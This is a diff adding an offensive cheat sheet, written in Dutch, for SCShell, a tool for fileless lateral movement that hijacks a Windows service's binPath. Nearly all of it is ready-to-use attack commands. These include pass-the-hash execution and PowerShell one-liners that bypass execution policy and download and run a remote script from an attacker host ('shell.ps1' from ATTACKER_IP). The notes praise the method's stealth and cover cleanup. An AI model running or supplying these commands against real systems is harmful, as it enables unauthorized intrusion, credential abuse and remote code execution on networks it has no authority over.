@@ -1,0 +1,24 @@
+# SCShell — Fileless lateral movement via Service Configuration
+# Wijzigt de binPath van een bestaande service voor code execution
+# Geen bestanden op disk — zeer stealthy
+#
+# === Vereisten ===
+# - Local admin op doelwit
+# - RPC poort 135 open
+#
+# === Voorbeelden ===
+
+# SCShell - Commando uitvoeren via service herconfig
+python3 scshell.py DOMAIN/USER:'PASS'@TARGET_IP -service-name defragsvc -command 'C:\Windows\System32\cmd.exe /c powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString(\"http://ATTACKER_IP/shell.ps1\")'
+
+# Met NTLM hash
+python3 scshell.py DOMAIN/USER@TARGET_IP -hashes :NT_HASH -service-name XblGameSave -command 'cmd /c whoami > C:\temp\out.txt'
+
+# Windows binary versie
+.\SCShell.exe TARGET_IP XblGameSave DOMAIN USER PASS "cmd /c powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"
+
+# Noot: Download: https://github.com/Mr-Un1k0d3r/SCShell
+# Noot: Gebruikt ChangeServiceConfigA om binPath tijdelijk te wijzigen
+# Noot: Service wordt gestart, binPath wordt uitgevoerd, service faalt (normaal)
+# Noot: Originele binPath wordt NIET automatisch hersteld — handmatig opruimen
+# Noot: Alleen RPC (135) nodig — geen SMB/WinRM vereist
